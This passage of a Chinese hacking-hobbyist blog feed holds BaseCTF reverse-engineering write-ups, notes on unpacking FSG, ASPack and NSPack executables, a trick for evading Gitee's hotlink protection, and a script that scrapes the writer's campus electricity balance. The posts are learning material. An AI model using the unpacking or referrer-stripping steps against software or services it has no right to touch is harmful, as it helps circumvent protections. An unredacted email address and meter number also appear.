&gt; Chrome/37.0.0.0 Mobile Safari/537.36 &gt; MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>Origin: http://xdxfdf.xtu.edu.cn<br>Referer: http://xdxfdf.xtu.edu.cn/app/api/main/wxpay/payStepOne?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br>Accept-Encoding: gzip, deflate, br<br>Cookie: JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXX<br>Connection: keep-alive<br><br>wxId=XXXXXXXXXXXXXXXXXXX&amp;appId=XXXXXXXXXXXXXXXXXXXXXXX<br></code></pre></td></tr></table></figure><p>在python中的写法便是</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-comment"># 请求的 URL</span><br>url = <span class="hljs-string">&quot;https://xdxfdf.xtu.edu.cn/app/app/api/user/searchBindHouseListForMoney&quot;</span><br>headers = &#123;<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;JSESSIONID=XXXXXXXXXXXXXXXXX&quot;</span>,<br>        &#125;<br>data = &#123;<br>    <span class="hljs-string">&quot;wxId&quot;</span>: <span class="hljs-string">&quot;XXXXXXXXXXXXX&quot;</span>,<br>    <span class="hljs-string">&quot;appId&quot;</span>: <span class="hljs-string">&quot;XXXXXXXXXXXXX&quot;</span>,<br>&#125;<br>response = requests.post(url, headers=headers,data=data)<br><span class="hljs-comment"># 检查响应状态码</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求成功！&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;响应内容:&quot;</span>, response.json())  <span class="hljs-comment"># 假设返回的内容是 JSON 格式</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;响应内容:&quot;</span>, response.text)<br></code></pre></td></tr></table></figure><p>可见重要的其实是cookie<br>我们的响应内容是(json转义后的)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>&#x27;data&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span>&#x27;customer_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">00116607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;house_id&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;meter&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span>&#x27;meter_status&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;customer_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">00116607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;sysId&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;wallet_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> &#x27;house_addr&#x27;<span class="hljs-punctuation">:</span> &#x27;XXXX&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">64.18</span><span class="hljs-punctuation">,</span> &#x27;meter_type&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_balance_time&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">20240914225456</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;buy_time&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;free_balance&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;house_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;pay_type&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;customer_name&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">000017001111</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_id&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxxxxxxxxxxx&#x27;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> &#x27;house_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;wallet_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> &#x27;house_addr&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;customer_name&#x27;<span class="hljs-punctuation">:</span> &#x27;XXXXXXXXXXXXX&#x27;<span class="hljs-punctuation">,</span> &#x27;pay_customer_flag&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">0</span>&#x27;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> &#x27;msg&#x27;<span class="hljs-punctuation">:</span> &#x27;&#x27;<span class="hljs-punctuation">,</span> &#x27;ret&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>成功获取我们要的报文后我们了解了在python中存在一个交SMTP的库，自带的竟然是,直接贴使用代码，看得更清楚些</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br> <br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-keyword">from</span> email.mime.text <span class="hljs-keyword">import</span> MIMEText<br><span class="hljs-keyword">from</span> email.header <span class="hljs-keyword">import</span> Header<br> <br><span class="hljs-comment"># 第三方 SMTP 服务</span><br>mail_host=<span class="hljs-string">&quot;smtp.XXX.com&quot;</span>  <span class="hljs-comment">#设置服务器</span><br>mail_user=<span class="hljs-string">&quot;XXXX&quot;</span>    <span class="hljs-comment">#用户名</span><br>mail_pass=<span class="hljs-string">&quot;XXXXXX&quot;</span>   <span class="hljs-comment">#口令 </span><br> <br> <br>sender = <span class="hljs-string">&#x27;from@runoob.com&#x27;</span><br>receivers = [<span class="hljs-string">&#x27;429240967@qq.com&#x27;</span>]  <span class="hljs-comment"># 接收邮件，可设置为你的QQ邮箱或者其他邮箱</span><br> <br>message = MIMEText(<span class="hljs-string">&#x27;Python 邮件发送测试...&#x27;</span>, <span class="hljs-string">&#x27;plain&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>message[<span class="hljs-string">&#x27;From&#x27;</span>] = Header(<span class="hljs-string">&quot;菜鸟教程&quot;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>message[<span class="hljs-string">&#x27;To&#x27;</span>] =  Header(<span class="hljs-string">&quot;测试&quot;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br>subject = <span class="hljs-string">&#x27;Python SMTP 邮件测试&#x27;</span><br>message[<span class="hljs-string">&#x27;Subject&#x27;</span>] = Header(subject, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br> <br><span class="hljs-keyword">try</span>:<br>    smtpObj = smtplib.SMTP() <br>    smtpObj.connect(smtp.qq.com, <span class="hljs-number">25</span>)    <span class="hljs-comment"># 25 为 SMTP端口号 456为ssh加密端口号</span><br>    smtpObj.login(mail_user,mail_pass)  <span class="hljs-comment">#用户的邮箱号，pass不是密码是SMTP授权号码</span><br>    smtpObj.sendmail(sender, receivers, message.as_string())<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;邮件发送成功&quot;</span><br><span class="hljs-keyword">except</span> smtplib.SMTPException:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error: 无法发送邮件&quot;</span><br></code></pre></td></tr></table></figure><p>我们需要开启qq邮箱的smtp服务,了解了<br><img src="https://gitee.com/fogpost/photo/raw/master/202409150023941.png" srcset="/img/loading.gif" lazyload><br>顺便贴一个From的格式我在这里卡住了。。。邮箱格式要正确呜呜呜<br><img src="https://gitee.com/fogpost/photo/raw/master/202409150023846.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF202409</title>
    <link href="/2024/09/14/BaseCTF202409/"/>
    <url>/2024/09/14/BaseCTF202409/</url>
    
    <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h3><p>既然是UPX那必须先DIE查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141119212.png" srcset="/img/loading.gif" lazyload><br>一看就不对劲，upx最多只见过3.96的，不过这里先用upx自己脱一下可以脱<br>直接继续查，64位无壳，进入ida<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141122619.png" srcset="/img/loading.gif" lazyload><br>明显的base64直接，解密<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141123562.png" srcset="/img/loading.gif" lazyload><br>秒解<br>BaseCTF{Hav3_@_g0od_t1m3!!!}</p><h3 id="ez-xor"><a href="#ez-xor" class="headerlink" title="ez_xor"></a>ez_xor</h3><p>简单xor，直接看ida，查位数64位<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141128380.png" srcset="/img/loading.gif" lazyload><br>看码了解，关键函数keystream和encrpt，输入长度为28，str、v11、v12、v13加起来正好28位,这个题目要注意的就是ida中的c是小端序的会所有的数据都会反转，而且记得使用原数据，不要用转义后的容易出错<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141137462.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409141138498.png" srcset="/img/loading.gif" lazyload><br>写pythonexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#官方wp</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_stream</span>(<span class="hljs-params">key</span>):<br>    key_box = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>):<br>        key_box.append(key[i%<span class="hljs-number">3</span>] ^ i)<br>    <span class="hljs-keyword">return</span> key_box<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">enc, key</span>):<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    key = key[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>        flag += <span class="hljs-built_in">chr</span>(enc[i] ^ key[i])<br>    <span class="hljs-keyword">return</span> flag<br><br>enc1 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1D0B2D2625050901&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc2 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;673D491E20317A24&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc3 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;34056E2E2508504D&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc4 = <span class="hljs-string">b&quot;\&quot;@;%&quot;</span><br>enc = enc1 + enc2 + enc3 + enc4<br><span class="hljs-built_in">print</span>(enc)<br><br>key = (<span class="hljs-number">7499608</span>).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br>key_box = key_stream(key)<br><span class="hljs-built_in">print</span>(key_box)<br><br>flag = decrypt(enc,key_box)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="BasePlus"><a href="#BasePlus" class="headerlink" title="BasePlus"></a>BasePlus</h3><p>以上来就搞个base64啊，我感觉像，但是没有确定，于是就看不懂函数里面的几个值为什么没有数了，这么奇怪，果然还是没有学过，不过这次好好分析了一番下次应该就可以瞬间秒杀了，看题<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141107908.png" srcset="/img/loading.gif" lazyload><br>我们能了解重要函数为Encode，进入<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141108814.png" srcset="/img/loading.gif" lazyload><br>了解了这个是base64后我们还要和源代码分析，发现存在不同<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141109133.png" srcset="/img/loading.gif" lazyload><br>了解了这中间有个异或的操作，十分简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">do</span><br>&#123;<br>    *(_BYTE *)(a2 + v8) = v4[v8] ^ <span class="hljs-number">0xE</span>;<br>    ++v8;<br>&#125;<br><span class="hljs-keyword">while</span> ( v8 != v5 );<br></code></pre></td></tr></table></figure><p>直接cyberChef换表加异或双重解密完成，<br>贴个无广告的<a href="https://cyberchef.org/">cyberchef</a><br><img src="https://gitee.com/fogpost/photo/raw/master/202409141116043.png" srcset="/img/loading.gif" lazyload><br>得到flag<br>BaseCTF{BA5e_DEcoD1N6_sEcr3t}</p><h3 id="Ezpy"><a href="#Ezpy" class="headerlink" title="Ezpy"></a>Ezpy</h3><p>首先就是按照惯例，文件属性查询，直接die，也可以用DEID或者peexam去查。不过die很全面，但是确实很卡<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151024364.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409151027465.png" srcset="/img/loading.gif" lazyload><br>看题目我们就知道是一个这是一个python题目，其实还有一个办法，pythonexe图标大多都是这个，看DIE竟然没有显示是什么软件打包的，那么我们便可以试试pyinstxtractor<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151029748.png" srcset="/img/loading.gif" lazyload><br>这就是解包过程，和使用方法，在这个过程中pyinstxtractor会自动创建一个导出包，我们可以查看，同时我们也可以发现解包软件对python版本的需求，你有想法的可以用<a href="https://zhuanlan.zhihu.com/p/36402791">pyenv</a>去除掉这个错误，其实我感觉没什么区别，主要在于后面pyc文件中的magic number<br>进入解包文件夹，会发现资源文件夹和大量的动态链接库，我们只取敌将首级，直接看到一个没有后缀的题目同名软件Ezpy<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151035853.png" srcset="/img/loading.gif" lazyload><br>这个其实是pyc也就是python的字节码。我们需要的就是这个，python大部分就是利用pyc来进行反编译，我们所知的反编译工具有<a href="https://www.52pojie.cn/thread-1854345-1-1.html">pycdc</a>(pycdc会有些麻烦，不过感觉强大些，因为是反编译难免会出现错误，而这个的错误出现会更加稀少)和<a href="https://pypi.com.cn/project/uncompyle6/">uncompyle6</a>这个的安装非常的简单，有python就行(但是只支持3.8及一下的，作者大大不更3.9了)<br>好现在我们开始执行一下pycdc(记得改Ezpy后缀名，pycdc就没关系)，就会发现惊喜了，失败了<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151042742.png" srcset="/img/loading.gif" lazyload><br>这个就是我说的magicnumber的问题解决办法也非常简单，一般解包后都会自带一个struct文件。用字节查看器打开推荐<a href="https://www.52pojie.cn/thread-1863194-1-1.html">010</a>，不过大部分都是损坏的我在这贴一个<a href="https://blog.csdn.net/OrientalGlass/article/details/134612786">magicnumber</a>。<br>注意大小端序，照着改就行。建议是十六个字节，留空留下栈区<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151053398.png" srcset="/img/loading.gif" lazyload><br>然后直接反编译(也可以用网络版的)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> Key<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_Sbox</span>(<span class="hljs-params">seed</span>):<br>    k_b = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span> = <span class="hljs-literal">None</span>: [ <span class="hljs-built_in">ord</span>(seed[i % <span class="hljs-built_in">len</span>(seed)]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    s = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + k_b[i]) % <span class="hljs-number">256</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyStream</span>(<span class="hljs-params">text, Sbox</span>):<br>    s = Sbox.copy()<br>    (i, j) = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    k = [<br>        <span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(text)<br>    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span><br>        k[r] = s[t] ^ Key.keykey[r % <span class="hljs-built_in">len</span>(Key.keykey)]<br>    <span class="hljs-keyword">return</span> k<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Encrypt</span>(<span class="hljs-params">text, seed</span>):<br>    Sbox = init_Sbox(seed)<br>    key = KeyStream(text, Sbox)<br>    enc = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span> = <span class="hljs-literal">None</span>: [ text[i] ^ key[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br>enc = <span class="hljs-string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span><br>flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please input Your flag:&#x27;</span>)<br>flag = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ <span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(flag)<br>flag = Encrypt(flag, Key.key)<br><span class="hljs-keyword">if</span> flag != enc:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;It&#x27;s not flag!&quot;</span>)<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;You are right!&#x27;</span>)<br>sys.exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>就是一个非常简单的rc4<br>直接给出exp</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可恶的gitee吃掉外链了</title>
    <link href="/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/"/>
    <url>/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/</url>
    
    <content type="html"><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>这是这个博客最开始的故事，我想要用gitee做一个图床，当时我怎么也没想到gitee居然拒绝掉外链的请求了，就像这样<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122231370.png" srcset="/img/loading.gif" lazyload><br>但是反复尝试我们发现了一下返回值</p><h3 id="防盗链"><a href="#防盗链" class="headerlink" title="防盗链"></a>防盗链</h3><p>要实现防盗链，就需要知道图片的请求是从哪里发出的。可以实现这一功能的有请求头中的origin和referer。origin只有在XHR请求中才会带上，所以图片资源只能借助referer</p><p>通过判断请求的referer，如果请求来源不是本站就返回302</p><h4 id="一个完整的流程："><a href="#一个完整的流程：" class="headerlink" title="一个完整的流程："></a>一个完整的流程：</h4><ul><li>首先请求正常的图片，但是没有返回200，而是302重定向，其中响应头中的location就是要重定向去向的地址</li><li>接着浏览器会自动请求这个location，并用这个返回结果代替第一次请求的返回内容<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122241207.png" srcset="/img/loading.gif" lazyload></li></ul><h4 id="如何破解防盗链"><a href="#如何破解防盗链" class="headerlink" title="如何破解防盗链"></a>如何破解防盗链</h4><p>想让gitee不知道我在盗用，就不能让他发现请求的来源是第三方，只要把referer藏起来就好</p><p><img src="https://gitee.com/fogpost/photo/raw/master/202409122236635.png" srcset="/img/loading.gif" lazyload><br>但是我们可以骗过gitee，用butterfly和yilia的主题可以上网搜搜都有讲，fluid这类的不同，但是我们这里要讲下进阶的代码注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122233566.png" srcset="/img/loading.gif" lazyload><br>按上面这个我们就可以写出header头前的代码来注入，骗过gitee使图片显现<br>下面是我的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">hexo.<span class="hljs-property">extend</span>.<span class="hljs-property">injector</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">&#x27;head_begin&#x27;</span>, <span class="hljs-string">&#x27;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&#x27;</span>, <span class="hljs-string">&#x27;post&#x27;</span>);<br></code></pre></td></tr></table></figure><p>注解：</p><meta name="referrer" content="no-referrer" /> 指定了 "no-referrer" 的内容，意味着浏览器在发送请求时不会包含任何引用来源信息。换句话说，当用户从当前网页跳转到其他页面时，新页面接收到的请求中将不包含这个跳转前的页面地址<p><a href="https://blog.csdn.net/weixin_52479803/article/details/131774501">参考文章</a></p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSG脱壳过程中的IAT修复</title>
    <link href="/2024/09/12/FSG%E8%84%B1%E5%A3%B3/"/>
    <url>/2024/09/12/FSG%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h3 id="FSG脱壳过程中的IAT修复"><a href="#FSG脱壳过程中的IAT修复" class="headerlink" title="FSG脱壳过程中的IAT修复"></a>FSG脱壳过程中的IAT修复</h3><p>进行手动查找和IAT修复<br>找可以在动态连接库中查得到的call<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122016001.png" srcset="/img/loading.gif" lazyload><br>在命令行中敲425210然后查连接库函数<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122016599.png" srcset="/img/loading.gif" lazyload><br>向上向下查找为0的数值(分割处)<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122016253.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409122016865.png" srcset="/img/loading.gif" lazyload><br>手动修改RVA和size的值<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122016959.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>asp脱壳</title>
    <link href="/2024/09/12/asp%E8%84%B1%E5%A3%B3/"/>
    <url>/2024/09/12/asp%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<p>asp脱壳时利用</p><h4 id="模拟跟踪法"><a href="#模拟跟踪法" class="headerlink" title="模拟跟踪法"></a>模拟跟踪法</h4><p>利用tc命令跟踪<br><img src="http://gitee.com/fogpost/photo/raw/master/image12.png" srcset="/img/loading.gif" lazyload><br>查找带有sfx和输入表的字段<br><img src="http://gitee.com/fogpost/photo/raw/master/image-1.png" srcset="/img/loading.gif" lazyload><br>这个方法由于时程序自动进行的所以十分缓慢不建议用  </p><h4 id="SFX法"><a href="#SFX法" class="headerlink" title="SFX法"></a>SFX法</h4><p><img src="http://gitee.com/fogpost/photo/raw/master/image-3.png" srcset="/img/loading.gif" lazyload><br>自动抵达<br><img src="http://gitee.com/fogpost/photo/raw/master/image-4.png" srcset="/img/loading.gif" lazyload></p><h3 id="nspack"><a href="#nspack" class="headerlink" title="nspack"></a>nspack</h3><p>巧妙脱壳法<br><img src="http://gitee.com/fogpost/photo/raw/master/image-5.png" srcset="/img/loading.gif" lazyload><br>at GetVersion  </p><p>下版本断点<br><img src="http://gitee.com/fogpost/photo/raw/master/image-6.png" srcset="/img/loading.gif" lazyload><br>在retn处下断点<br>单步F8之后到打OEP之后向前找OEP<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122015500.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEcompact脱壳</title>
    <link href="/2024/09/12/PEcompact/"/>
    <url>/2024/09/12/PEcompact/</url>
    
